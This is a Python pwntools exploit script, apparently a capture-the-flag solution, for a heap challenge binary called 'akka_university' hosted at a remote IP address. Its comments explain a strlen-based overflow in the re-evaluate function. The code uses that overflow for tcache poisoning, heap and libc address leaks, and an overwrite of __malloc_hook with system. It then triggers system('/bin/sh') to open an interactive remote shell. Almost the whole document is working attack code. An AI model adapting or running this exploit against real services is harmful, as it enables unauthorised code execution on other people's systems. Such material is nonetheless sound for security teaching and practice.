#!/usr/bin/env python3

#The bug lies in revaluate function..When u give remarks of length 56
#There will be no nulls remaining there for string termination
#The revaluate function uses strlen function to get the length of remarks bug
#There is no null in between remarks and address variable causes the strlen function to get the lngth of remarks + address overflow
#This causes a restricted write what where condition but cannot overwrite anything in libc address range with FULL RELRO
#So no direct overwrite of malloc hook ..
#Need to fill tcache bin and then proceed to overwrite the malloc hook with system function
#And then make the large allocation to make a call to system('/bin/sh')


from pwn import *

e = ELF("./akka_university")
libc = ELF("./libc.so.6")
r  = remote("3.99.48.161",9006)
#r = process("./akka_university")
index = 0

def correct_paper(size,name,marks,remarks,log):
    global index
    r.sendafter(b">>",b"1\n")
    r.sendafter(b">>",f"{size}\n")
    r.sendafter(b">>",name)
    r.sendafter(b">>",f"{marks}\n")
    r.sendafter(b">>",remarks)
    r.sendafter(b">>",log)
    index+=1
    return index - 1

def put_arrears(index):
    r.sendafter(b">>",b"2\n")
    r.sendafter(b">>",f"{index}\n")

def view_the_answer_sheet(index):
    r.sendafter(b">>",b"3\n")
    r.sendafter(b">>",f"{index}\n")
    r.recvuntil(b"contents\n")
    leak = r.recvuntil(b"\n===============================================").strip(b"\n===============================================")
    heap_leak = u64(leak[0:6].decode('latin-1').ljust(8,'\x00'))
    return heap_leak


def Re_evaluate_paper(index,name,marks,remarks,log):
    r.sendafter(b">>",b"4\n")
    r.sendafter(b">>",f"{index}\n")
    r.sendafter(b">>",name)
    r.sendafter(b">>",f"{marks}\n")
    r.sendafter(b">>",remarks)
    r.sendafter(b">>",log)

r.timeout = 1.0
chunk_A = correct_paper(136,b"AAAA",40,b"A" * 56,b"A" * 40)       #Allocate 3 chunks
chunk_B = correct_paper(136,b"BBBB",100,b"B" * 56,b"B" * 40)      
chunk_C = correct_paper(136,b"CCCC",100,b"C" * 56,b"C" * 40)
put_arrears(chunk_A)                                                #Free 2 chunks which will write in the tcache fd 
put_arrears(chunk_B)
Re_evaluate_paper(chunk_C,b"CCCC",100,b"C" * 56 + b"\x30",b"\xa0") #Overflow the remarks variable plus 6 bytes allows us to give a restricted write condition
heap_leak = view_the_answer_sheet(chunk_C)                          #Get the heap leak
log.info("The Heap leak is " + hex(heap_leak))
partial_write1 = int(hex(heap_leak + 0x480)[-4:],16)                 #Ready up two partial writes for upcoming exploit
partial_write2 = int(hex(heap_leak)[-4:],16)
for i in range(0,8):                                                  #Fill the tcache bin of 0x88 range
    correct_paper(136,b"DD",60,b"D" * 56,b"D" * 40)                   
for i in range(3,10):
    put_arrears(i)
guard_chunk1 = correct_paper(40,b"EEE",90,b"E" * 56,b"E" *40)       #A guard chunk to prevent chunk consolidation 
put_arrears(10)                                                     #Free to get Unsortedbin metadata 
Re_evaluate_paper(chunk_C,b"CC",100,b"C" * 56 + p16(partial_write1),b"\xe0") #Use the uaf condition to get a Read After free to get libc leak
libc_leak = view_the_answer_sheet(chunk_C)                                   #Parsing the libc leak to get libc base
libc_base = libc_leak - 0x1ebbe0                                             
log.info("The libc base of the address is " + hex(libc_base))                
Re_evaluate_paper(chunk_C,b"CC",100,b"C" * 56 + p16(partial_write2),p64(libc_base + libc.sym["__malloc_hook"]))
#Using the poisoned chunk to modify the tcache fd
for i in range(0,6):
    correct_paper(136,b"DD",60,b"D" * 56,b"D" * 40)                 #Make allocations to reach the malloc hook to overwrite it with system address
shell = correct_paper(136,b"EEE",100,b"E" * 56,p64(libc_base + libc.sym["system"]))
size_field = libc_base + next(libc.search(b"/bin/sh\x00"))          #Make  the special allocation to perform system('/bin/sh') 
correct_paper(size_field,b"FFF",100,b"F" * 56,"34")
r.interactive()                                                      #Boom!! You got a shell
